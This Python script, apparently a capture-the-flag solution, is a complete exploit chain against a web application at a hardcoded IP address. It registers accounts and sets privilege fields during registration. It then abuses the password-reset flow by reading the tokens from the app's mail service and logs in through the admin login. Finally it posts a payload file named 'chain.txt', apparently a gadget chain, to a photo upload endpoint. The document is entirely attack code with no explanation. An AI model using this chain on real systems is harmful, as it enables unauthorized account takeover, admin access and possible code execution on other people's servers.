import re
import requests
import os

URL = "http://20.55.48.101/"
email = os.urandom(8).hex() + "@b.com"
password = os.urandom(8).hex()
print(email, password)

# create /mail account
session = requests.Session()
session.post(
	URL + "/mail/index.php",
	data={
	"register-submit": "1",
	"email": email,
	"password": password,
	"confirm-password": password
	}
)

# login to /mail account
session.post(
	URL + "/mail/index.php", data={
	"login-submit": "1",
	"email": email,
	"password": password,
	}
)

# create main account
session.post(
	URL + "/register.php",
	data={
	"register-submit": "1",
	"email": email,
	"password": password,
	"confirmed": 1,
	"level": 0
	}
)

# forget password
session.post(URL + "/forget_password.php", data={"recover-submit": "1", "email": email})

# get tokens from /mail
mail_resp = session.get(URL + "/mail/mail.php").text
reset_link = re.findall(r"mail_view.php\?id=[-0-9a-f]+", mail_resp)[1]
token1, token2 = re.findall(r"\d+", session.get(URL + "/mail/" + reset_link).text)
print(token1, token2)

# reset password

session.get(
	URL + "reset_password.php",
	params={
	"email": email,
	"new_password": password,
	"token1": token1,
	"token2": token2
	},
	timeout=10
)

# login as admin
session.post(
	URL + "/admin_login.php", data={
	"login-submit": "1",
	"email": email,
	"password": password
	}
)

print(session.post(URL + "user_photo.php", data={"img": open("chain.txt").read().strip()}).text)
